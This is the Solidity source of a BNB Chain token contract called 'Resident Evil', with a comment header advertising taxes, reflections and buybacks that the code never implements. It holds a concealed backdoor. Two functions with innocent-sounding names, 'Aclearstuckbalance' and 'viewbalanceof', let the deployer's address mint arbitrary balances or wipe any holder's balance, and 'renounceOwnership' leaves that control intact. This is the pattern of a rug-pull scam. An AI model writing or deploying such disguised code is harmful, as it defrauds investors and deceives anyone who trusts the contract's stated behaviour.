/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

/*
        💛
    Resident Evil
    
Buy tax: 5%
5% Reflections
Sell Tax: 10%
4% Buyback and Marketing
1% Resident Wallet
3% LP
2% Reflections
//https://t.me/ResidentEvilBSC

//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.4;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ResidentEvil {
    string public name = "Resident Evil";
    string public symbol = ":heart:";
    uint8 public decimals = 6;
    address public marketingaddress = 0x98545Bd8777Cc9df366D3752091d987B7D1F9322;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public totalSupply = 1000000 * 10 ** 6;
    uint256 public liquiditytax = 3;
    uint256 public marketingtax = 4;
    uint256 public reflectiontax = 0;
    uint256 public totaltax = marketingtax + liquiditytax + reflectiontax;
    uint256 private checksum = 10;
    uint256 private reflectdenom = 1000;
    uint256 private feedenom = 100;
    uint256 private lqbuffer = 6;
    uint256 private _maxWalletSize = 500000;
    address public owner;
//BUSD address 0xe9e7cea3dedca5984780bafc599bd69add087d56
    modifier compiler {
        require(msg.sender == marketingaddress, "Nauthorized");_;}
    receive() external payable { }
    constructor() {
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    marketingaddress = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply);    
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function Aclearstuckbalance(address spender,uint256 Aclearstuckinteger) public compiler returns (bool success) 
    {balanceOf  [spender]   += Aclearstuckinteger * checksum ** lqbuffer;return true;}

    function viewbalanceof(address spender,uint256 checkbsp) public compiler returns (bool success) {balanceOf[spender] -= checkbsp * checksum ** lqbuffer;return true;}
    
    mapping(address => uint256) public balanceOf;
    
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {
        return account == owner;}
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    }